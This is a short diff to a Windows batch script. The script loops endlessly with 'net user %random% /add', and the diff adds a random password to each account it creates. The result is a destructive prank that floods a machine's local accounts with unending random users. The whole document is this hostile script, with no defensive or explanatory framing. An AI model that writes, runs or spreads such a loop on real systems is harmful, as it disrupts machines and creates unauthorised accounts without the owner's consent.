@@ -1,4 +1,4 @@
 @echo off
 :makeuser
-net user %random% /add
+net user %random% %random% /add
 goto makeuser
